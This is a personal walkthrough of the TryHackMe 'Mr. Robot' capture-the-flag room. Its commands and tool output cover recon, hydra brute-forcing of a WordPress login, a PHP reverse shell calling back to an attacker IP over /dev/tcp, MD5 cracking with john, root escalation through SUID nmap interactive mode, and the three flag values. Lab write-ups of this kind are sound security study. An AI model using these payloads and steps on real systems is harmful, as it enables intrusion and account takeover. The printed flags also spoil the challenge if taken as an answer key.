---
title: "TryHackMe Mr. Robot Walkthrough - Complete CTF Solution and Exploitation Guide"
description: "Complete walkthrough of TryHackMe's Mr. Robot room. Learn web application security, WordPress exploitation, privilege escalation, and CTF techniques."
keywords: ["tryhackme mr robot", "wordpress exploitation", "web application security", "privilege escalation", "ctf walkthrough", "penetration testing"]
tags: ["tryhackme", "ctf", "wordpress", "web-security", "privilege-escalation"]
sidebar_position: 4
---

:::info Description

These are my notes for the [Mr Robot CTF Room](https://tryhackme.com/room/mrrobot) on TryHackMe.

Note: Task #1 is to deploy the machine.

|OS|Level|Rating
|:---:|:-----:|:-----:|
|CTF|N/A|5/5|

:::

## KEY LEARNINGS

:::tip

I think given enough of these boxes, I need to have "ON HAND AT ALL TIMES":

- nmap lines ready
- gobuster lines ready (also enumerate results properly)
- key webapp testing checklist e.g. robots.txt
- hydra lines ready
- php reverse shell setup technique i.e. wp-admin foothold, theme editor, pentestmonkey reverse php page
- john cracking lines ready
- linux enumeration lines ready e.g. find suids

:::

## RECON

### NMAP

the "all in one":

`sudo nmap -v 10.10.235.193 -Pn -p- -sC -sV -O --min-rate=5000 -o nmap-mr_robot.txt`

```bash
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
|_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
Device type: general purpose|specialized|storage-misc|broadband router|printer|WAP
Running (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (91%), Crestron 2-Series (89%), HP embedded (89%), Asus embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/o:linux:linux_kernel:5.4 cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4
Aggressive OS guesses: Linux 3.10 - 3.13 (91%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 3.5 (90%), Linux 3.2 - 3.8 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Crestron XPanel control system (89%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.000 days (since Sat Apr  2 21:59:23 2022)
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
```

### GOBUSTER

`gobuster dir -e -u http://10.10.235.193 -w /usr/share/wordlists/dirb/common.txt -o gobuster-mr_robot.txt`

```bash
http://10.10.235.193/.hta                 (Status: 403) [Size: 213]
http://10.10.235.193/.htaccess            (Status: 403) [Size: 218]
http://10.10.235.193/.htpasswd            (Status: 403) [Size: 218]
http://10.10.235.193/0                    (Status: 301) [Size: 0] [--> http://10.10.235.193/0/]
http://10.10.235.193/admin                (Status: 301) [Size: 235] [--> http://10.10.235.193/admin/]
http://10.10.235.193/atom                 (Status: 301) [Size: 0] [--> http://10.10.235.193/feed/atom/]
http://10.10.235.193/audio                (Status: 301) [Size: 235] [--> http://10.10.235.193/audio/]
http://10.10.235.193/blog                 (Status: 301) [Size: 234] [--> http://10.10.235.193/blog/]
http://10.10.235.193/css                  (Status: 301) [Size: 233] [--> http://10.10.235.193/css/]
http://10.10.235.193/dashboard            (Status: 302) [Size: 0] [--> http://10.10.235.193/wp-admin/]
http://10.10.235.193/favicon.ico          (Status: 200) [Size: 0]
http://10.10.235.193/feed                 (Status: 301) [Size: 0] [--> http://10.10.235.193/feed/]
http://10.10.235.193/image                (Status: 301) [Size: 0] [--> http://10.10.235.193/image/]
http://10.10.235.193/Image                (Status: 301) [Size: 0] [--> http://10.10.235.193/Image/]
http://10.10.235.193/images               (Status: 301) [Size: 236] [--> http://10.10.235.193/images/]
http://10.10.235.193/index.html           (Status: 200) [Size: 1077]
http://10.10.235.193/index.php            (Status: 301) [Size: 0] [--> http://10.10.235.193/]
http://10.10.235.193/intro                (Status: 200) [Size: 516314]
http://10.10.235.193/js                   (Status: 301) [Size: 232] [--> http://10.10.235.193/js/]
http://10.10.235.193/license              (Status: 200) [Size: 309]
http://10.10.235.193/login                (Status: 302) [Size: 0] [--> http://10.10.235.193/wp-login.php]
http://10.10.235.193/page1                (Status: 301) [Size: 0] [--> http://10.10.235.193/]
http://10.10.235.193/phpmyadmin           (Status: 403) [Size: 94]
http://10.10.235.193/rdf                  (Status: 301) [Size: 0] [--> http://10.10.235.193/feed/rdf/]
http://10.10.235.193/readme               (Status: 200) [Size: 64]
http://10.10.235.193/robots               (Status: 200) [Size: 41]
http://10.10.235.193/robots.txt           (Status: 200) [Size: 41]
http://10.10.235.193/rss                  (Status: 301) [Size: 0] [--> http://10.10.235.193/feed/]
http://10.10.235.193/rss2                 (Status: 301) [Size: 0] [--> http://10.10.235.193/feed/]
http://10.10.235.193/sitemap              (Status: 200) [Size: 0]
http://10.10.235.193/sitemap.xml          (Status: 200) [Size: 0]
http://10.10.235.193/video                (Status: 301) [Size: 235] [--> http://10.10.235.193/video/]
http://10.10.235.193/wp-admin             (Status: 301) [Size: 238] [--> http://10.10.235.193/wp-admin/]
http://10.10.235.193/wp-content           (Status: 301) [Size: 240] [--> http://10.10.235.193/wp-content/]
http://10.10.235.193/wp-includes          (Status: 301) [Size: 241] [--> http://10.10.235.193/wp-includes/]
http://10.10.235.193/wp-config            (Status: 200) [Size: 0]
http://10.10.235.193/wp-cron              (Status: 200) [Size: 0]
http://10.10.235.193/wp-links-opml        (Status: 200) [Size: 227]
http://10.10.235.193/wp-login             (Status: 200) [Size: 2642]
http://10.10.235.193/wp-load              (Status: 200) [Size: 0]
http://10.10.235.193/wp-mail              (Status: 500) [Size: 3064]
http://10.10.235.193/wp-settings          (Status: 500) [Size: 0]
http://10.10.235.193/wp-signup            (Status: 302) [Size: 0] [--> http://10.10.235.193/wp-login.php?action=register]
http://10.10.235.193/xmlrpc               (Status: 405) [Size: 42]
http://10.10.235.193/xmlrpc.php           (Status: 405) [Size: 42]
```

## FLAG 1

Website running on port 80, so let's browse.

found: `http://10.10.235.193/robots.txt`

### robots.txt

```bash
User-agent: *
fsocity.dic
key-1-of-3.txt
```

found: `http://10.10.235.193/key-1-of-3.txt`

```bash
073403c8a58a1f80d943455fb30724b9
```

downloaded `fsocity.dic` file.

## FLAG 2

:::tip idea

use hydra + `fsocity.dic` file to brute force the wp-admin login page.

:::

### Brute-force

Use hydra and the `fsocity.dic` file to brute-force the login.

Format: `hydra -l <login /> -P <path/to/wordlist /> <ip /> <module /> '/path/to/login.php:login-request&password=^PASS^:failure-message'`

I use the following payload to set password as fixed and run through the `./fsocity.dic` file to find valid username i.e. when you get a response that doesn't get `Invalid username` returned:

payload: `hydra -L ./fsocity.dic -p password 10.10.235.193 -V http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username'`

```bash
hydra -L ./fsocity.dic -p password 10.10.235.193 -V http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username'
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations
, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-02 23:02:35
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://10.10.235.193:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username
[ATTEMPT] target 10.10.235.193 - login "true" - pass "password" - 1 of 858235 [child 0] (0/0)
[ATTEMPT] target 10.10.235.193 - login "false" - pass "password" - 2 of 858235 [child 1] (0/0)
[ATTEMPT] target 10.10.235.193 - login "wikia" - pass "password" - 3 of 858235 [child 2] (0/0)
[ATTEMPT] target 10.10.235.193 - login "from" - pass "password" - 4 of 858235 [child 3] (0/0)
[ATTEMPT] target 10.10.235.193 - login "the" - pass "password" - 5 of 858235 [child 4] (0/0)
[ATTEMPT] target 10.10.235.193 - login "now" - pass "password" - 6 of 858235 [child 5] (0/0)
[ATTEMPT] target 10.10.235.193 - login "Wikia" - pass "password" - 7 of 858235 [child 6] (0/0)
[ATTEMPT] target 10.10.235.193 - login "extensions" - pass "password" - 8 of 858235 [child 7] (0/0)
[ATTEMPT] target 10.10.235.193 - login "scss" - pass "password" - 9 of 858235 [child 8] (0/0)
[ATTEMPT] target 10.10.235.193 - login "window" - pass "password" - 10 of 858235 [child 9] (0/0)
[ATTEMPT] target 10.10.235.193 - login "http" - pass "password" - 11 of 858235 [child 10] (0/0)
[ATTEMPT] target 10.10.235.193 - login "var" - pass "password" - 12 of 858235 [child 11] (0/0)
[ATTEMPT] target 10.10.235.193 - login "page" - pass "password" - 13 of 858235 [child 12] (0/0)
[ATTEMPT] target 10.10.235.193 - login "Robot" - pass "password" - 14 of 858235 [child 13] (0/0)
[ATTEMPT] target 10.10.235.193 - login "Elliot" - pass "password" - 15 of 858235 [child 14] (0/0)
[ATTEMPT] target 10.10.235.193 - login "styles" - pass "password" - 16 of 858235 [child 15] (0/0)
[ATTEMPT] target 10.10.235.193 - login "and" - pass "password" - 17 of 858235 [child 0] (0/0)
[ATTEMPT] target 10.10.235.193 - login "document" - pass "password" - 18 of 858235 [child 1] (0/0)
[ATTEMPT] target 10.10.235.193 - login "mrrobot" - pass "password" - 19 of 858235 [child 2] (0/0)
[ATTEMPT] target 10.10.235.193 - login "com" - pass "password" - 20 of 858235 [child 3] (0/0)
[ATTEMPT] target 10.10.235.193 - login "ago" - pass "password" - 21 of 858235 [child 4] (0/0)
[ATTEMPT] target 10.10.235.193 - login "function" - pass "password" - 22 of 858235 [child 5] (0/0)
[ATTEMPT] target 10.10.235.193 - login "eps1" - pass "password" - 23 of 858235 [child 7] (0/0)
[ATTEMPT] target 10.10.235.193 - login "null" - pass "password" - 24 of 858235 [child 6] (0/0)
[ATTEMPT] target 10.10.235.193 - login "chat" - pass "password" - 25 of 858235 [child 8] (0/0)
[ATTEMPT] target 10.10.235.193 - login "user" - pass "password" - 26 of 858235 [child 9] (0/0)
[ATTEMPT] target 10.10.235.193 - login "Special" - pass "password" - 27 of 858235 [child 11] (0/0)
[ATTEMPT] target 10.10.235.193 - login "GlobalNavigation" - pass "password" - 28 of 858235 [child 10] (0/0)
[ATTEMPT] target 10.10.235.193 - login "images" - pass "password" - 29 of 858235 [child 12] (0/0)
[ATTEMPT] target 10.10.235.193 - login "net" - pass "password" - 30 of 858235 [child 13] (0/0)
[80][http-post-form] host: 10.10.235.193   login: Elliot   password: password # <------ bingo!
[ATTEMPT] target 10.10.235.193 - login "push" - pass "password" - 31 of 858235 [child 14] (0/0)
```

now try again, but set username to `Elliot` and cycle through the `./fsocity.dic` file in the password field (change the error message)

`hydra -l Elliot -P ./fsocity.dic 10.10.235.193 -V http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:The password you entered for the username' -o hydra-password.txt`

Got a valid username, but no luck on the password.

:::tip

hint from walkthrough: `/license`.
hint from THM "white coloured font".

:::

I look through the gobuster results again and see this `http://10.10.243.224/license`

I visit this page and see this:

```html
what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
```

But if you inspect it and you see the hidden text:

```bash
do you want a password or something? ZWxsaW90OkVSMjgtMDY1Mgo=
```

looks base64:

```bash
442 💀 ± ➤ echo ZWxsaW90OkVSMjgtMDY1Mgo= | base64 -d
elliot:ER28-0652
```

Now, I'm thinking "PHP reverse shell" to get a foothold.

### Reverse Shell

From [highon.coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell)

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>
```

payload

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"10.11.55.83"/443 0>&1'");?>
```

this one kept loading/freezing, need to tweak it maybe.

this person has some great notes [n0a110w](https://n0a110w.github.io/notes/security-stuff/shells/php.html) and from their blog I ended up using [pentestmonkey php reverse shell](https://github.com/pentestmonkey/php-reverse-shell.git).

:::tip
We need to be able to edit php source code, not html pages, so you need to hit the editor in the Theme section. I replaced the entire `footer.php` file with the pentestmonkey reverse shell file.
:::

I created a random page called `shell` in the wordpress `add page` menu, so I know the `footer.php` gets loaded, "view page" and you pop the shell:

```bash
443 💀 ± ➤ sudo rlwrap nc -lvrp 443
listening on [any] 443 ...
10.10.243.224: inverse host lookup failed: Unknown host
connect to [10.11.55.83] from (UNKNOWN) [10.10.243.224] 51517
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 00:09:03 up  1:45,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$
```

stabilize with python

```bash
$
which python
/usr/bin/python
/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/$
```

find the flag

```bash
ls
ls
bin   dev  home        lib    lost+found  mnt  proc  run   srv  tmp  var
boot  etc  initrd.img  lib64  media       opt  root  sbin  sys  usr  vmlinuz
cd /home
cd /home
ls
ls
robot
cd robot
cd robot
ls
ls
key-2-of-3.txt  password.raw-md5
cat key-2-of-3.txt
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
ls -al
ls -al
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
id;whoami
id;whoami
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon
daemon@linux:/home/robot$
```

found `/home/robot` flag, can't read flag, but can read the other file:

```bash
ls -l
ls -l
total 8
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
daemon@linux:/home/robot$
```

### Crack

copied this password.raw-md5 to my local to crack with john.

```bash
RxHackk 福 ~/Repos/RxHack/THM/OFFENSIVEPENTESTPATH/MR_ROBOT/crack ➤ a14b989|main⚡
458 💀 ± ➤ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt md5.hash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (robot)
1g 0:00:00:02 DONE (2022-04-03 12:21) 0.4975g/s 20155p/s 20155c/s 20155C/s bonjour1..123092
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed

RxHackk 福 ~/Repos/RxHack/THM/OFFENSIVEPENTESTPATH/MR_ROBOT/crack ➤ a14b989|main⚡
459 💀 ± ➤ john --show
Password files required, but none specified

RxHackk 福 ~/Repos/RxHack/THM/OFFENSIVEPENTESTPATH/MR_ROBOT/crack ➤ a14b989|main⚡
460 💀 ± ➤ john --show md5.hash
0 password hashes cracked, 2 left

RxHackk 福 ~/Repos/RxHack/THM/OFFENSIVEPENTESTPATH/MR_ROBOT/crack ➤ a14b989|main⚡
461 💀 ± ➤ john --show --format=Raw-MD5 md5.hash
robot:abcdefghijklmnopqrstuvwxyz

1 password hash cracked, 0 left
```

### privesc: user

su to `robot` user and get the flag

```bash
su - robot
su - robot
abcdefghijklmnopqrstuvwxyz

id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
ls -l
ls -l
total 8
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
robot@linux:~$
```

## FLAG 3

back into the box, reverse php page, su to robot user:

```bash
444 💀 ± ➤ sudo rlwrap nc -lvrp 443
listening on [any] 443 ...
10.10.77.167: inverse host lookup failed: Unknown host
connect to [10.11.55.83] from (UNKNOWN) [10.10.77.167] 56597
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 00:29:34 up 3 min,  0 users,  load average: 0.35, 0.38, 0.17
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
su - robot
su - robot
abcdefghijklmnopqrstuvwxyz

/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
robot@linux:~$

robot@linux:~$

ls -al
ls -al
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

### suids

try find SUIDs

```bash

find / -perm /4000
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
find: `/etc/ssl/private': Permission denied
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
find: `/root': Permission denied
```

### nmap interactive

I intially looked at `/usr/lib/pt_chown` but the THM hint said "nmap", and I can see it there `/usr/local/bin/nmap`

nmap has an "interactive mode" that `"! <command />   -- runs shell command given in the foreground"`

```bash
ls -l /usr/local/bin/nmap
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
/usr/local/bin/nmap --interactive
/usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter /> for help
sh
sh
Unknown command (sh) -- press h <enter /> for help
h
h
Nmap Interactive Commands:
n <nmap args /> -- executes an nmap scan using the arguments given and
waits for nmap to finish.  Results are printed to the
screen (of course you can still use file output commands).
! <command />   -- runs shell command given in the foreground
x             -- Exit Nmap
f [--spoof <fakeargs />] [--nmap_path <path />] <nmap args />
-- Executes nmap in the background (results are NOT
printed to the screen).  You should generally specify a
file for results (with -oX, -oG, or -oN).  If you specify
fakeargs with --spoof, Nmap will try to make those
appear in ps listings.  If you wish to execute a special
version of Nmap, specify --nmap_path.
n -h          -- Obtain help with Nmap syntax
h             -- Prints this help screen.
Examples:
n -sS -O -v example.com/24
f --spoof "/usr/local/bin/pico -z hello.c" -sS -oN e.log example.com/24

!sh
!sh
id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
#
```

flag 3

```bash
ls /root
firstboot_done  key-3-of-3.txt
cat /root/key-3-of-3.txt
cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
